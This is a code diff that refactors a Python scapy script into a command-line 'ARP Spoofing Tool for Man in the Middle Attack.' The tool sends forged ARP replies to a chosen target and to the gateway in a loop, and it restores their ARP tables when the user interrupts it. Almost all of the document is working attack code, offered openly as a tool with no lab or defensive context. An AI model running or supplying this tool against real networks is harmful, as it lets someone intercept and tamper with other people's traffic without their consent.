@@ -1,56 +1,90 @@
 #!/usr/bin/env python3
-
-import scapy.all as scapy
+import argparse
+from scapy.layers.l2 import ARP, Ether
+from scapy.sendrecv import srp
+from scapy.all import conf, send
 import time
-import sys
+import sys, os
 
-victim = "192.168.0.218"  # input("Enter victim IP address: ")
-gw = scapy.conf.route.route("0.0.0.0")[2]
-packet_counter = 0
+def root_check():
+    if os.geteuid() != 0:
+        sys.exit("[!] This script must run as root")
+    else:
+        print("[*] Welcome to the ARP Spoofer.")
+packet_count = 0
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for Man in the Middle Attack")
+    parser.add_argument('-t', '--target', required=True, help="Target's IP address")
+    parser.add_argument('-g', '--gateway', default=conf.route.route("0.0.0.0")[2], help="Gateway IP address (default: system default gateway)")
+    return parser.parse_args()
 
 def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    answered_list = srp(arp_request_broadcast, timeout=2, retry=1, verbose=False)[0]
 
     if answered_list:
         return answered_list[0][1].hwsrc
     else:
-        print(f'[!] No response received for {ip}. Check network connectivity and permissions!')
+        print(f"[!] No response received for {ip}. Check network connectivity and permissions!")
         return None
 
-def spoof(victim_ip, spoof_ip):
-    global packet_counter
+def spoof_arp(target_ip, spoof_ip):
+    global packet_count
 
-    target_mac = get_mac(victim_ip)
+    target_mac = get_mac(target_ip)
     if target_mac is None:
-        print(f'[!] Could not get MAC address for {victim_ip}. Exiting...')
-        return
+        print(f'[!] Could not get MAC address for {target_ip}. Exiting...')
+        return False
 
-    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+    packet_count += 1
 
-    packet_counter += 1
+    print(f"[*] Sent spoofed ARP packet to {target_ip}, spoofing as {spoof_ip}. Total packets sent: {packet_count}")
+    return True
 
-    print(f"\r [+] Standing in the middle of Gateway: {gw} and Victim: {victim}. Total packets sent: {packet_counter}",
-          end="")
-
-def restore(destination_ip, source_ip):
+def restore_arp(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_ip)
-    scapy.send(packet, count=4, verbose=False)
+    if destination_mac is None or source_mac is None:
+        print(f"[!] Could not resolve MAC addresses for restore operation between {destination_ip} and {source_ip}")
+        return
 
-try:
-    while True:
-        spoof(gw, victim)
-        spoof(victim, gw)
-        sys.stdout.flush()
+    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    send(packet, count=4, verbose=False)
+    print(f"[*] Sent restore ARP packets to {destination_ip} to fix ARP table")
+
+if __name__ == "__main__":
+    root_check()
+    args = parse_args()
+
+    victim_ip = args.target
+    gateway_ip = args.gateway
+
+    if get_mac(victim_ip) is None:
+        print("[!] Could not resolve victim MAC address. Exiting.")
+        sys.exit(1)
+
+    if get_mac(gateway_ip) is None:
+        print("[!] Could not resolve gateway MAC address. Exiting.")
+        sys.exit(1)
+
+    try:
+        while True:
+            success1 = spoof_arp(target_ip=gateway_ip, spoof_ip=victim_ip)
+            success2 = spoof_arp(target_ip=victim_ip, spoof_ip=gateway_ip)
+
+            if not (success1 and success2):
+                print("[!] Some spoof packets failed to send due to MAC resolution failures.")
+
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print("\n[+] Detected User Interruption ... Resetting ARP table ... Please wait.")
+        restore_arp(victim_ip, gateway_ip)
+        restore_arp(gateway_ip, victim_ip)
         time.sleep(2)
-except KeyboardInterrupt:
-    print("\n[+] Detected User Interruption ... Resetting ARP table ... Please wait.\n")
-    restore(victim, gw)
-    restore(gw, victim)
-    time.sleep(2)
-    print("[+] Restoring Attempt Completed ... Quitting")
+        print("[*] ARP table restored. Exiting.")
